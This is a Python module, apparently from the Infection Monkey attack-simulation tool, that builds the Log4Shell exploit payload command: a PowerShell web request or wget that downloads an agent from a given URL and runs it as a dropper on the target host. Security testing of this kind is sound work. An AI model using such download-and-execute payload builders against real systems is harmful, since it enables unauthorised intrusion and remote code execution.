import logging

from agentpluginapi import TargetHost
from monkeytypes import OperatingSystem

from common.command_builder import (
    AgentMode,
    IAgentCommandBuilderFactory,
    LinuxDownloadMethod,
    LinuxDownloadOptions,
    LinuxRunOptions,
    WindowsDownloadMethod,
    WindowsDownloadOptions,
    WindowsRunOptions,
    WindowsShell,
)
from infection_monkey.exploit.tools.helpers import get_agent_dst_path

logger = logging.getLogger(__name__)


def build_log4shell_command(
    target_host: TargetHost,
    agent_download_url: str,
    agent_command_builder_factory: IAgentCommandBuilderFactory,
) -> str:
    monkey_path = get_agent_dst_path(target_host)
    agent_command_builder = None
    download_options = None
    run_options = None
    if target_host.operating_system in [
        OperatingSystem.WINDOWS,
        None,  # Based on a quick Shodan search, tomcat seems to be
        # the most popular service out of the three that we have,
        # and is mostly deployed on Windows.
        # If the target host's OS is unknown, default to Windows.
    ]:
        download_options = WindowsDownloadOptions(
            agent_destination_path=monkey_path,
            download_method=WindowsDownloadMethod.WEB_REQUEST,
            download_url=agent_download_url,
            shell=WindowsShell.POWERSHELL,
        )
        run_options = WindowsRunOptions(
            agent_destination_path=monkey_path, agent_mode=AgentMode.DROPPER
        )
        agent_command_builder = agent_command_builder_factory.create_windows_agent_command_builder()
    else:
        download_options = LinuxDownloadOptions(
            agent_destination_path=monkey_path,
            download_method=LinuxDownloadMethod.WGET,
            download_url=agent_download_url,
        )

        run_options = LinuxRunOptions(
            agent_destination_path=monkey_path, agent_mode=AgentMode.DROPPER
        )

        agent_command_builder = agent_command_builder_factory.create_linux_agent_command_builder()

    agent_command_builder.build_download_command(download_options)
    agent_command_builder.build_run_command(run_options)
    command = agent_command_builder.get_command()
    logger.debug(f"COMMAND: {command}")
    return command
